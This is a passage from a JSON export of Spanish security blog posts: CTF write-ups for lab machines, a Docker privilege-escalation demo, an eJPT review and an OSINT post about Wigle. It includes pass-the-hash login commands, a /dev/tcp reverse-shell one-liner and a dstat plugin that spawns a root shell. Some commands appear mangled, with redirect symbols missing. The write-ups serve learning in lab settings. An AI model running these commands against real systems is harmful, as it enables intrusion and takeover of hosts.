seleccionada en la imagen contiene una contraseña que parece ser un hash [NTLM](https://security.stackexchange.com/questions/161889/understanding-windows-local-password-hashes-ntlm) del usuario administrador. Validamos el hash con *crackmapexec*.\n\n\n```\n❯ crackmapexec smb 10.10.10.63 -u \"Administrator\" -H \"e0fbxxxxxxxxxxxxxxxxxxx\"\nSMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)\nSMB         10.10.10.63     445    JEEVES           [+] Jeeves\\Administrator e0fbxxxxxxxxxxxxxxxx (Pwn3d!)\n```\n**Como aparece la palabra (Pwn3d!), confirmamos que el hash es correcto.**\n\nA continuación, ejecutamos *psexec.py* para entablar una shell.\n\n\n```\n❯ psexec.py WORKGROUP/administrator@10.10.10.63 -hashes :e0fbxxxxxxxxxxxxxxxxxxxxxx\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\n...\nMicrosoft Windows [Version 10.0.10586]\n(c) 2015 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32 whoami\nnt authority\\system\n```\nEstamos dentro como usuario Administrator y buscamos la flag.\n\nEn el escritorio encontramos un archivo que nos dice que lo que buscamos está en algún otro sitio más profundo.\n\n\n```\nC:\\Users\\Administrator\\Desktop type hm.txt\nThe flag is elsewhere.  Look deeper.\n```\nNTFS tiene la posibilidad de almacenar la información en distintos streams de datos. Se puede encontrar más información [aquí](https://www.deepinstinct.com/blog/the-abuse-of-alternate-data-stream-hasnt-disappeared). Para enumerar todos los archivos/streams de archivos se emplea el parámetro /r.\n\nDespués, invocamos el comando [more](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/more) de Powershell para ver el siguiente stream de información. \n\n\n```\nC:\\Users\\Administrator\\Desktop dir /r\n Directory of C:\\Users\\Administrator\\Desktop\n\n11/08/2017  09:05 AM     .\n11/08/2017 09:05 AM  ..\n12/24/2017 02:51 AM 36 hm.txt\n 34 hm.txt:root.txt:$DATA\n\nC:\\Users\\Administrator\\Desktop more  hm.txt:root.txt\nafbcxxxxxxxxxxxxxx\n```\n"
    },
    {
        "title": "Docker puede ser un problema de seguridad en tu sistema",
        "slug": "docker-puede-ser-un-problema-de-seguridad",
        "date": "2022-02-13",
        "tags": [
            "Hacking",
            "Docker",
            "Vulnerabilities",
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/docker-puede-ser-un-problema-de-seguridad/docker.webp",
            "/static/images/uploads/docker-puede-ser-un-problema-de-seguridad/image-23.webp",
            "/static/images/uploads/docker-puede-ser-un-problema-de-seguridad/image-24.webp"
        ],
        "draft": false,
        "summary": "Docker puede ser un problema de seguridad cuando se ejecuta como Root. Esto permite a usuarios sin privilegios acceder a archivos protegidos de root a través de contenedores. Es importante configurarlo correctamente y concienciar sobre los riesgos.",
        "content": "![](/static/images/uploads/docker-puede-ser-un-problema-de-seguridad/docker.webp)\n\nDocker nació (o mejor dicho, fue presentado al público) en la PyCon de 2013 en una charla titulada *\"The future of Linux Containers\"*. Recomiendo ver el video que aparece a continuación (son menos de 6 minutos) y disfrutar del hecho de que en la informática, estamos viviendo lo que en un futuro será la \"historia del desarrollo de software\".\n\nY es que los *Albert Einstein* del software como *[Linus Torvalds](https://es.wikipedia.org/wiki/Linus_Torvalds), [Robert C. Martin](https://es.wikipedia.org/wiki/Robert_C._Martin), [Martin Fowler](https://martinfowler.com/), [Guido Van Rossum](https://es.wikipedia.org/wiki/Guido_van_Rossum)* o muchos de los inventores de lenguajes de programación que se encuentran en el 99% del software que utilizamos, están vivos a día de hoy.\n\nPero volviendo al tema de Docker. Docker no trajo consigo la tecnología de contenedores que se usa en Linux. Esto es algo que lleva existiendo desde [hace más de 20 años](https://blog.aquasec.com/a-brief-history-of-containers-from-1970s-chroot-to-docker-2016) con diferentes nombres como Chroot en 1979, Jails en el 2000 y contenedores a partir de 2004. Pero no fue hasta el 2013 cuando esta tecnología se empezó a utilizar por la mayoría de la gente.\n\nLa verdadera ventaja que trajo Docker, fue la posibilidad de intercambiar imágenes de contenedores entre sistemas de una forma sencilla con los manifiestos Dockerfile y todo el ecosistema de alrededor. Pero no está libre de ser juzgado por mucha gente.\n\n**Uno de los problemas que se le achaca a Docker es que Docker Daemon se ejecuta como Root.** Y esto trae implicaciones indirectas como veremos a continuación.\n\nCuando instalamos Docker siguiendo el tutorial su [página oficial](https://docs.docker.com/engine/install/ubuntu/), nos invita a seguir un proceso post-instalación en la [siguiente página](https://docs.docker.com/engine/install/linux-postinstall/) donde nos enseñan que **podemos ejecutar Docker sin permisos de root, metiendo a un usuario normal al grupo de Docker**. Y es que aquí está la clave del problema. Podemos llegar a pensar que ejecutar Docker con un usuario normal es más seguro, cuando eso no cambia nada y de hecho, te da una sensación de seguridad que puede resultarte caro como veremos en la prueba de concepto.\n\nPor romper una lanza a favor de ellos, en esa misma página podemos encontrar el cuadro a continuación.\n\n![](/static/images/uploads/docker-puede-ser-un-problema-de-seguridad/image-23.webp)\n\nY es que si, todos (o al menos yo alguna vez) solemos pasar por alto este tipo de mensajes si es que hemos llegado a verlos, porque en la mayoría de los blogs donde nos enseñan a instalar Docker en nuestro sistema directamente no nos previenen del riesgo de tener un usuario \"sin privilegios\" en el grupo de Docker. Además, \"eso de Daemon Attack Surface a mi me suena a chino\" 😎.\n\n# Prueba de concepto\n\n## 1. Contexto del problema\n\nTenemos 2 usuarios en nuestro sistema, **root** y **demo**.\n\n\n```\n──[root@parrot]─[/root]──# id\nuid=0(root) gid=0(root) grupos=0(root)\n```\n\n```\n──[demo@parrot]─[/home/demo]$ id\nuid=1001(demo) gid=1003(demo) grupos=1003(demo),1000(docker)\n```\nComo vemos, demo está en el grupo Docker para poder lanzar contenedores y realizar su gestión. Como demo es un usuario con pocos privilegios, además, es un poco con el que solemos hacer todo pensando que así estamos más seguros.\n\n## 2. El archivo \"protegido\" de root\n\nHay un archivo en /home que se llama password.txt. Este archivo, en principio, tiene permisos 400 para que solo el usuario root pueda leer su contenido.\n\n\n```\n──[root@parrot]─[/home]──# ls -l\ntotal 4\ndrwxr-xr-x 1 demo demo 204 Feb 13 21:00 demo\n-r-------- 1 root root  16 Feb 13 21:03 password.txt\ndrwxr-xr-x 1 user user 614 Feb 13 19:53 user\n```\n![](/static/images/uploads/docker-puede-ser-un-problema-de-seguridad/image-24.webp)\n\nSi no conoces como funcionan los permisos de Linux no pasa nada, simplemente créete la siguiente afirmación de lo que ocurre.\n\n**Ningún otro usuario, ni grupo del sistema, puede acceder al contenido del archivo password.txt con los permisos actuales.**\n\nSi aún así intentamos leer su contenido con el usuario demo, vemos el siguiente error.\n\n\n```\n──[demo@parrot]─[~/demo]───$ cat /home/password.txt \ncat: /home/password.txt: Permiso denegado\n```\nHasta aquí todo bien, ¿correcto?\n\n## 3. Docker Daemon Attack Surface\n\nA continuación, el usuario demo, el que no tenía privilegios, el que no podía leer el contenido de root, crea un contenedor del siguiente modo.\n\n\n```\n──[demo@parrot]─[~/demo]───$ docker run -v /:/vulnerable -it alpine /bin/sh\nUnable to find image 'alpine:latest' locally\nlatest: Pulling from library/alpine\n59bf1c3509f3: Pull complete \nDigest: sha256:21a3deaa0d32a8057914f36584b5288d2e5ecc984380bc0118285c70fa8c9300\nStatus: Downloaded newer image for alpine:latest\n/ #\n```\nY una vez, dentro del contenedor, empieza la magia 🧙‍♂️.\n\n\n```\n/ # whoami\nroot\n/ # cat vulnerable/home/password.txt\nP0wn3dP@ssw0rd!\n```\nEs decir, un usuario sin privilegios, fuera del contexto de los contenedores no teníamos acceso a los archivos que root controlaba. \n\nDentro del contexto de los contenedores, si mapeamos en un volumen la raíz de todo el disco a una ruta del contenedor, tendremos control total de los archivos del sistema.\n\n## 4. Conclusión\n\n¿Es el título del post clickbait? En parte sí. Más que una vulnerabilidad es un problema de no tener las cosas bien configuradas. \n\n¿La página oficial de Docker podría explicar el problema o señalarlo de una mejor forma? Seguro que también.\n\nLa realidad es que ellos no tienen la culpa. En su misma página explican todo esto. Y la realidad también es que poca gente es conocedora de este problema de \"mala configuración\". Es responsabilidad de todos hacer pedagogía y explicarles a nuestros compañeros los riesgos que acarrea según que cosas y yo, con este post, dejo mi granito de arena.\n\n¿Cómo deberías mitigar esto? Teniendo en mente que el usuario con el que gestionas Docker es como un usuario root. Protégelo con una buena contraseña y aíslalo del resto de cosas que haces en el sistema.\n\n"
    },
    {
        "title": "CTF - Epsilon WriteUp",
        "slug": "ctf-epsilon",
        "date": "2022-02-17",
        "tags": [
            "CTF",
            "Hacking",
            "AWS",
            "Lambda",
            "SSTI",
            "Tar",
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/ctf-epsilon/epsilon.webp"
        ],
        "draft": true,
        "summary": "Reto CTF de Capture The Flag: explora máquinas CTF con vulnerabilidades como GitTools, JWT, AWS Lambda, SSTI y pspy. Aprende más sobre ellos con las referencias proporcionadas.",
        "content": "![](/static/images/uploads/ctf-epsilon/epsilon.webp)\n\ngitools https://github.com/internetwache/GitTools\n\njwt https://jwt.io/ https://pyjwt.readthedocs.io/en/stable/\n\naws lambda https://docs.aws.amazon.com/cli/latest/reference/lambda/list-functions.html\n\nssti [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#jinja2---basic-injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection)\n\npspy https://github.com/DominicBreuker/pspy\n\nman tar -h\n\n"
    },
    {
        "title": "CTF - Previse WriteUp",
        "slug": "ctf-previse",
        "date": "2022-02-22",
        "tags": [
            "CTF",
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/ctf-previse/Previse.webp",
            "/static/images/uploads/ctf-previse/image-25.webp"
        ],
        "draft": true,
        "summary": "Reto CTF que consiste en encontrar vulnerabilidades en una máquina de dificultad fácil. Se realiza un escaneo de puertos y se encuentra la existencia de un puerto abierto. Se realiza un fuzzing en la web para descubrir URLs.",
        "content": "![](/static/images/uploads/ctf-previse/Previse.webp)\n\nUna máquina de dificultad fácil. Una de las últimas días antes de presentarme al eJPT.\n\nIniciamos el escaneo de puertos con nmap donde visualizo los siguientes puertos interesantes.\n\n\n```\nnmap -p- --open -sS -T5 -n -Pn 10.10.11.104 -oG allPorts\nDiscovered open port 22/tcp on 10.10.11.104\nDiscovered open port 80/tcp on 10.10.11.104\n```\nPruebo a fuzzear la web\n\n\n```\nwfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \"http://previse.htb/FUZZ.php\"\n=====================================================================\nID           Response   Lines    Word       Chars       Payload     \n=====================================================================         \n000000015:   302        71 L     164 W      2801 Ch     \"index\"               \n000000053:   200        53 L     138 W      2224 Ch     \"login\"               \n000000094:   302        112 L    263 W      4914 Ch     \"files\"               \n000000191:   200        20 L     64 W       980 Ch      \"header\"             \n000000333:   200        5 L      14 W       217 Ch      \"footer\"             \n000000017:   302        0 L      0 W        0 Ch        \"download\"           \n000000764:   302        74 L     176 W      2966 Ch     \"status\" \n000001225:   302        0 L      0 W        0 Ch        \"logout\"  \n000001389:   302        93 L     238 W      3994 Ch     \"accounts\" \n000001490:   200        0 L      0 W        0 Ch        \"config\"   \n000000200:   200        31 L     60 W       1248 Ch     \"nav\"    \n000002271:   302        0 L      0 W        0 Ch        \"logs\" \n```\n![](/static/images/uploads/ctf-previse/image-25.webp)\n\n"
    },
    {
        "title": "Review del eJPT en 2022",
        "slug": "ejpt-review-2022",
        "date": "2022-02-27",
        "tags": [
            "Hacking",
            "Pentesting",
            "Blog",
            "#Import 2022-12-20 21:06"
        ],
        "images": [
            "/static/images/uploads/ejpt-review-2022/carbon.webp",
            "/static/images/uploads/ejpt-review-2022/image-27.webp",
            "/static/images/uploads/ejpt-review-2022/image-28.webp",
            "/static/images/uploads/ejpt-review-2022/image-30.webp"
        ],
        "draft": false,
        "summary": "Recientemente obtuve la certificación eJPT, una de las certificaciones más reconocidas en el pentesting. El examen consta de 20 preguntas tipo test y se centra en ataques a redes y vulnerabilidades. Es recomendable para aquellos que deseen adentrarse en el mundo de la ciberseguridad.",
        "content": "![](/static/images/uploads/ejpt-review-2022/carbon.webp)\n\nHace unos días me presenté al examen para obtener la certificación del [**eJPT**](https://elearnsecurity.com/product/ejpt-certification/) (eLearnSecurity Junior Penetration Tester). Para los que no lo sepáis, es una de las varias certificaciones con cierta reputación que existen dentro del ámbito del pentesting.\n\nDejo un [link](https://pauljerimy.com/security-certification-roadmap/) con el roadmap de todas las certificaciones que existen sobre redes y ciberseguridad, donde puedes ver los **CCNA** de Cisco, las relativas a Cloud Architect (AWS, Google Cloud y Azure) y otras más del contexto de la ciberseguridad como el **OSCP**.\n\n![https://pauljerimy.com/security-certification-roadmap/](/static/images/uploads/ejpt-review-2022/image-27.webp)\n\nLlegados hasta aquí, analizaré en detalle los siguientes puntos.\n\n## 💻 Cómo fue la experiencia del examen\n\nEl proceso para obtener el certificado es el siguiente.\n\n* **Paso 1:** Compra la opción de presentarte al examen [aquí](https://elearnsecurity.com/?post_type=product&p=10890). (son 200$ que al cambio se quedan en unos 177€)\n* **Paso 2:** Desde el momento de la compra, tienes 180 días para prepararte el examen en [INE](https://my.ine.com/path/a223968e-3a74-45ed-884d-2d16760b8bbd) siguiendo el plan de estudio que tienen para el **eJPT**. La preparación para este examen es totalmente gratuita y tienes laboratorios prácticos al estilo CTF. Si cuentas con conocimientos previos en ámbito de redes, ciberseguridad y has hecho algún CTF, no necesitas mucho más que repasar su plan de estudios para presentarte al examen.\n* **Paso 3:** Inicia el proceso del examen. Desde ese momento tienes 3 días para terminarlo. Si suspendes, tienes una opción de recuperación antes de 14 días.\n\nLos resultados del examen los recibes directamente. El formato del examen son 20 preguntas tipo test, algunas de ellas con opción múltiple, y tienes que aprobar un 75% del examen. Es decir, solo puedes fallar 5 de las 20 preguntas.\n\n Los 3 días son más que suficientes para aprobarlo. En mi caso, leí de mucha gente que lo suele terminar en unos 2 días y medio, siempre dependiendo de la preparación con la que te enfrentas a la prueba.\n\nYo lo terminé en menos de 24 horas, unas 13-14 horas efectivas (sin contar los descansos).\n\nEra mi primer examen de este tipo y la experiencia fue muy positiva. Tuve 2 momentos en los que me atasqué, al inicio del examen (si lees otras [reviews](https://www.reddit.com/r/eLearnSecurity/comments/jhbx2d/ejpt_routing_advice/) del eJPT debe ser bastante común el bloqueo de esta parte) y otra al final, a falta de contestar 2 preguntas del test. El resto de preguntas se contestan de forma bastante fácil.\n\n## ❓ ¿Necesito el eJPT?\n\nComo muchas de las preguntas que te puedes hacer en la vida, la respuesta es \"depende\". Si te quieres iniciar en el mundo del Pentesting o Hacking Ético, es desde luego recomendable obtener el **eJPT**.\n\nEn mi caso, me sirvió como termómetro del nivel de conocimiento necesario para sacar este tipo de certificaciones, ya que en el futuro me gustaría aspirar a otras como el [**eWPT**](https://elearnsecurity.com/product/ewpt-certification/)**, [eCPPTv2](https://elearnsecurity.com/product/ecpptv2-certification/)** o incluso el [**OSCP**](https://www.offensive-security.com/pwk-oscp/).\n\n## 🏋️‍♂️ ¿Cuál es la dificultad?\n\nEl **eJPT** es una de las certificaciones más básicas que existen en el mundo del Pentesting. Pero que esto no te lleve a un engaño. El hecho de catalogarla como básica no significa que sea para todo el mundo. Requiere de muchas horas de estudio y dedicación, sobre todo si no has invertido antes tiempo en plataformas CTF o el conocimiento que tienes sobre software, redes y vulnerabilidades es pequeño. En cualquier caso, el plan de estudio que tiene eLearningSecurity de forma gratuita es recomendable.\n\n## 🔑 Consejos para el examen\n\nCuando inicias el proceso, te descargas un archivo ZIP con una carta de compromiso como la que recibirías en la realidad en una empresa donde vas a realizar un pentesting. Lee cuidadosamente esta carta al inicio y repite la lectura eventualmente durante el examen. Encontrarás pistas que en un inicio pueden pasar desapercibidas.\n\n![](/static/images/uploads/ejpt-review-2022/image-28.webp)\n\nEl formato del pentesting que harás es de tipo BlackBox, por lo que no tendrás mucha información del entorno en el que te encuentras. En el ZIP inicial te entregarán un archivo PCAP que tendrás que abrir de manera local con Wireshark para tratar de extraer toda la información posible. Si no haces esto bien, no puedes continuar con el examen y es la parte donde la mayor parte de la gente se encuentra bloqueada.\n\n\n Enumera, enumera y enumera. Anota todo. No es un CTF.\n\nEn mi caso me preparé un esquema de como estaba constituida la red según iba recopilando información. Mantén este esquema actualizado. Es un buen modo de poder volver atrás y tener una visión global en todo momento. Además, siendo el examen de varios días, necesitas una manera de ponerte en situación rápidamente.\n\nEl curso gratuito hace mucho hincapié en herramientas como **Metasploit**. En mi caso, no me gusta mucho utilizarla porque en el 99% de los casos puedes ejecutar los exploits de forma más \"manual\" y es una buena forma de aprendizaje. En cualquier caso, durante el examen tuve que emplearla una vez. Con saber como buscar, configurar y ejecutar exploits en ella es suficiente. No necesitas ser un experto. Dedica más esfuerzos en aprender las siguientes herramientas que te serán de más utilidad durante el examen.\n\n* Nmap (Con especial hincapié en esta)\n* BurpSuite\n* Hydra\n* Smbclient\n* Sqlmap\n\n## 🎓 Conclusión\n\nEstoy muy contento con haber tomado la decisión de obtener esta certificación. La experiencia del examen ha sido muy buena y divertida. Finalmente, aunque pensaba que todas las preguntas del tipo test las tenía bien, fallé 1 de ellas obteniendo un 95% del resultado final.\n\nIntuyo cuál pudo ser la que estaba mal, pero en cualquier caso no te fíes. Lee bien todas y cada una de ellas. Repasa lo que puedas y anota todo lo que haces. En esta certificación no debes entregar un reporte de las vulnerabilidades, pero tener todo anotado te puede servir a ti a la hora de repasar el examen al final.\n\nLa recompensa, si todo ha ido bien, es la certificación que ves a continuación.\n\n![https://verified.elearnsecurity.com/certificates/cdbd4f81-182a-42f7-a48c-8c5199fe4b1d](/static/images/uploads/ejpt-review-2022/image-30.webp)\n\n### 👨‍💻 Happy Hacking! \n\n"
    },
    {
        "title": "CTF - Soccer WriteUp",
        "slug": "ctf-soccer-write-up",
        "date": "2022-12-27",
        "tags": [
            "CTF",
            "Rce",
            "Suid",
            "Dstat",
            "Doas",
            "Websockets"
        ],
        "images": [
            "/static/images/uploads/ctf-soccer-write-up/Soccer.webp",
            "/static/images/uploads/ctf-soccer-write-up/image.webp",
            "/static/images/uploads/ctf-soccer-write-up/favicon.ico",
            "/static/images/uploads/ctf-soccer-write-up/spider-orange.webp",
            "/static/images/uploads/ctf-soccer-write-up/image-1.webp",
            "/static/images/uploads/ctf-soccer-write-up/image-2.webp"
        ],
        "draft": true,
        "summary": "Reto CTF que consiste en encontrar un login vulnerable en un repositorio de Github. Se puede subir archivos y ejecutar código remoto. Luego, se puede realizar una inyección SQL y explotar los privilegios SUID del comando Doas para obtener acceso root.",
        "content": "![](/static/images/uploads/ctf-soccer-write-up/Soccer.webp)\n\nHacer nmap\n\nHacer wfuzz y encontrar /tiny\n\n![](/static/images/uploads/ctf-soccer-write-up/image.webp)\n\nIr al repositorio https://github.com/prasathmani/tinyfilemanager y encontrar el siguiente trozo de markdown.\n\nDefault username/password: **admin/admin@123** and **user/12345**.\n\n\nProbarlo y estar dentro.\n\nPuedes subir archivos y ejecutar codigo remoto \n\n[Tiny File Manager 2.4.6 - Remote Code Execution (RCE)Tiny File Manager 2.4.6 - Remote Code Execution (RCE). CVE-2021-45010CVE-2021-40964 . webapps exploit for PHP platform![](/static/images/uploads/ctf-soccer-write-up/favicon.ico)\n\nExploit DatabaseFEBIN MON SAJI![](/static/images/uploads/ctf-soccer-write-up/spider-orange.webp)](https://www.exploit-db.com/exploits/50828)Puedo entrar a una shell con el siguiente comando \n\n\n```\nbash -c \"sh -i & /dev/tcp/10.10.14.88/1111 0&1\"\n```\nMirando en /etc/***nginx***/***sites***-***available***/ vemos un subdominio: http://soc-player.soccer.htb. Es una web donde te puedes registrar y verificar tickets de futbol. \n\n![](/static/images/uploads/ctf-soccer-write-up/image-1.webp)\n\nLa comunicación que hay por debajo es websocket. \n\nExiste un script https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html que levanta un servidor http, que utilizaremos de proxy con sqlmap para poder realizar sqli directamente.\n\n![](/static/images/uploads/ctf-soccer-write-up/image-2.webp)\n\nEntro por ssh, y busco archivos suid \n\n\n```\nfind \\-perm -4000 2/dev/null\n```\nEncuentro doas\n\n\n```\nplayer@soccer:/usr/local/bin$ ls -l\n-rwsr-xr-x 1 root root 42224 Nov 17 09:09 doas\n-rwxr-xr-x 1 root root  2002 Nov 17 09:09 doasedit\n-rwxr-xr-x 1 root root  5471 Nov 17 09:09 vidoas\n```\nEl bit SUID activo.\n\nDoas es un comando similar a sudo, capaz de ejecutar comandos desde otro usuario dependiendo su configuración. Su archivo de configuración por defecto está en /etc/doas.conf pero este no es el caso. Mirando el archivo vidoas, observamos los siguiente\n\n\n```\nplayer@soccer:/usr/local/bin$ cat vidoas | grep conf\n# Edit a temporary copy of the doas.conf file and check it for syntax\n# errors before installing it as the actual doas.conf file.\nDOAS_CONF=/usr/local/etc/doas.conf\n...\n```\nHaciendo un cat en esa ruta, vemos \n\n\n```\nplayer@soccer:/usr/local/bin$ cat /usr/local/etc/doas.conf\npermit nopass player as root cmd /usr/bin/dstat\n```\ndstat es un comando para ver procesos del sistema. Leyendo MAN, vemos que tiene una carpeta de plugins /usr/local/share/dstat/\n\nCreamos un plugin dentro del directorio. El plugin tiene que seguir la siguiente convención de nombres: dstat\\_.py. Por lo que ejecutamos el siguiente comando:\n\n\n```\necho 'import os; os.system(\"bash -i\")'  dstat_privesc.py\n```\nAhora, debemos ejecutar dstat con ayuda de doas, siendo root y pasando el argumento necesario a dstat para que ejecute nuestro plugin. Como se denomina dstat\\_privesc, tenemos que ejecutar el siguiente comando\n\n\n```\ndoas -u root /usr/bin/dstat --privesc\nroot@soccer:/usr/local/share/dstat# whoami\n\n# Output\nroot\n```\n"
    },
    {
        "title": "OSINT - Redes inalámbricas",
        "slug": "osint-redes-inalambricas",
        "date": "2022-12-29",
        "tags": [
            "Blog",
            "Osint",
            "WiFi"
        ],
        "images": [
            "/static/images/uploads/osint-redes-inalambricas/osint.webp",
            "/static/images/uploads/osint-redes-inalambricas/image-5.webp",
            "/static/images/uploads/osint-redes-inalambricas/image-4.webp",
            "/static/images/uploads/osint-redes-inalambricas/wi-fi-1.webp"
        ],
        "draft": false,
        "summary": "En este post resumo qué es OSINT (inteligencia de fuentes libres) y su importancia en la obtención de información pública. También destaco la herramienta Wigle, que registra la ubicación de puntos de acceso inalámbricos y comento su uso y estadísticas. Además, comparto mi prueba personal de localizar una vivienda a partir de una red WiFi. Aporto la reflexión de cómo la información pública puede ser utilizada por diversos actores y la importancia de conocer estas herramientas.",
        "content": "![](/static/images/uploads/osint-redes-inalambricas/osint.webp)\n\n## ¿Que es OSINT?\n\nOSINT (**O**pen **S**ource **INT**elligence), o inteligencia de fuentes libres, hace referencia al conjunto de técnicas y herramientas para la obtención de información que muchas veces, sin saberlo, está de forma pública. Si queréis explicaciones más extensas y mejores, podéis ir directamente [aquí](https://letmegooglethat.com/?q=que+es+osint). En este post, voy a ir al grano y es suficiente con saber que todas las empresas (y personas) somos susceptibles de tener información pública en internet. Sí, tú también.\n\n## ¿Quién utiliza OSINT?\n\nGobiernos, ejércitos, ciberdelincuentes, hackers, RRHH de esa empresa que te acaba de entrevistar para contratarte y tu amigo cuando quiere saber el Facebook o TikTok de esa chica que le gusta (guiño, guiño). Porque sí, mirar los amigos de los amigos de los amigos de una persona, también es OSINT. Pero en este post vamos a tratar de herramientas desconocidas para el común de los mortales y tratar de concienciarnos un poco de la importancia de la información.\n\n## La herramienta de hoy... https://wigle.net\n\n[Wigle](https://wigle.net) (**Wi**reless **G**eographic **L**ogging **E**ngine), es un portal donde hay registrada la ubicación, además de otra información, de puntos de acceso inalámbricos a lo largo de todo el mundo. Esta información ha sido y es recopilada por voluntarios y posteriormente representada de una forma amigable a los usuarios como se puede ver en la imagen inferior.\n\n![Imagen obtenida de https://wigle.net](/static/images/uploads/osint-redes-inalambricas/image-5.webp)\n\nEl método de uso de esta aplicación es la siguiente:\n\n* A partir de una ubicación dada, encontrar redes WiFi disponibles, así como su información (SSID, si está cifrada y su tipo de cifrado, lat. y lon., dirección MAC).\n* Realizarlo de forma inversa, a partir de uno de estos datos, como el nombre de la red inalámbrica (SSID), ver si existe información disponible. Yo he hecho una prueba, pero esto te lo cuento al final.\n\n**Eso sí, necesitamos registrarnos gratuitamente para sacarle partido a la aplicación.**\n\nA continuación, te dejo unas estadísticas sobre esta herramienta a 29 de diciembre de 2022:\n\n* Hay 986.153.836 redes wifi.\n* Hoy se han añadido 450.550.\n* 1,275,820,545 dispositivos bluetooth.\n* 18,463,291 torres de telefonía móvil.\n\n![Estadísticas de redes y su cifrado a lo largo del tiempo enWigle](/static/images/uploads/osint-redes-inalambricas/image-4.webp)\n\nComo se puede ver en la imagen superior, en 20 años, el número de redes inalámbricas sin cifrar, ha pasado de ser más del 60% a convertirse en algo residual a partir del año 2018. **Buenas noticias**.\n\nPor otro lado, a día de hoy, el número de redes que utilizan un cifrado WPA2 esta cerca del 72%. El cifrado WPA3 apenas llega al 1% de adopción. Esto no es raro teniendo en cuenta que este último cifrado nació prácticamente enfermo, como podemos leer en este [enlace](https://www.xataka.com/seguridad/protocolo-seguridad-wpa3-para-redes-wifi-se-tambalea-tiene-grave-error-diseno).\n\nSi queremos conocer un poco más la herramienta, en su apartado de [preguntas frecuentes](https://wigle.net/faq) podemos ver para que a que está destinado este proyecto.\n\n## Prueba personal\n\nMe he animado a tratar de localizar mi antigua vivienda a partir del nombre de la red y efectivamente, alguien pasó por mi casa con una de estas aplicaciones encargadas de recopilar información relativa a mi WiFi.\n\n![Snapshot de mi red Wifi en Vitoria-Gasteiz](/static/images/uploads/osint-redes-inalambricas/wi-fi-1.webp)\n\nSeguro que algunos conocíais esta herramienta, pero apuesto a que la mayoría, no. Hace varios años escuché una charla de Chema Alonso (dejo un [link](https://www.elladodelmal.com/2020/05/como-evitar-que-google-utilice-tu-red.html) más reciente a su blog) hablando de cómo Google, basándose en la intensidad de la señal de las redes inalámbricas que detectaba en los móviles Android, era capaz de triangular la posición de una persona en el globo terráqueo. Es decir, no importa que desactivemos el GPS del móvil o que no le demos permisos a una aplicación de nuestra ubicación. Simplemente, si quieren saber donde estás, lo sabrán igual.\n\nEspero escribir pronto sobre nuevas herramientas de OSINT. Creo que puede ser una tirada de posts chula e interesante para aquellos que me leáis.\n\n\n “Conoce a tu enemigo y a ti mismo y en cien batallas nunca serás derrotado; Si eres ignorante de tu enemigo pero te conoces a ti mismo, las probabilidades de ganar o perder serán las mismas; si eres ignorante de tu enemigo y de ti mismo, saldrás derrotado siempre”. Sun Tzu, El arte de la Guerra.\n\n"
    },
    {
        "title": "CTF - Mentor WriteUp",
        "slug": "ctf-mentor",
        "date": "2022-12-30",
        "tags": [
            "Snmp",
            "Pivoting",
            "Docker",
            "Enumeration"
        ],
        "images": [
            "/static/images/uploads/ctf-mentor/Mentor.webp",
            "/static/images/uploads/ctf-mentor/image-6.webp",
            "/static/images/uploads/ctf-mentor/Untitled-2022-12-30-2011.svg",
            "/static/images/uploads/ctf-mentor/image-7.webp",
            "/static/images/uploads/ctf-mentor/image-8.webp",
            "/static/images/uploads/ctf-mentor/image-9.webp",
            "/static/images/uploads/ctf-mentor/image-10.webp",
            "/static/images/uploads/ctf-mentor/Untitled-2022-12-30-2011-1.svg"
        ],
        "draft": true,
        "summary": "En este reto CTF se realiza una enumeración de puertos utilizando NMAP y se detectan los puertos 22 (SSH) y 80 (HTTP). Se descubre un subdominio vulnerable a RCE (Remote Command Execution) que permite obtener una shell reversa y se aprovecha una vulnerabilidad de SNMP para obtener credenciales y escalar privilegios hasta obtener acceso root. Se consiguen las flags user.txt y root.txt.",
        "content": "![](/static/images/uploads/ctf-mentor/Mentor.webp)\n\n## Fase de enumeración\n\nRealizamos un escaneo completo de puertos con NMAP.\n\n\n```\n nmap -p- -sCV -vvv --min-rate 5000 -oG allPorts 10.10.11.193\n\n[*] Open ports: 22, 80\n```\nY apuntamos concretamente a los puertos 22 y 80, con tal de sacar más información que nos pueda ser útil.\n\n\n```\n nmap -p22,80 -vvv -sCV -oN targeted 10.10.11.193\n\n# Output\nPORT   STATE SERVICE REASON  VERSION\n22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO6yWCATcj2UeU/SgSa+wK2fP5ixsrHb6pgufdO378n+BLNiDB6ljwm3U3PPdbdQqGZo1K7Tfsz+ejZj1nV80RY=\n|   256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjv9f3Jbxj42smHEXcChFPMNh1bqlAFHLi4Nr7w9fdv\n80/tcp open  http    syn-ack Apache httpd 2.4.52\n|_http-title: Did not follow redirect to http://mentorquotes.htb/\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.52 (Ubuntu)\nService Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n```\nAquí ya vemos cosas interesantes. El servidor detrás del puerto 80, redirige peticiones a *mentorquotes.htb*, por lo que modificaremos nuestro archivo hosts con tal de poder resolver dicho dominio cuando llamemos al servidor Apache.\n\n\n```\n# /etc/hosts\n# Host 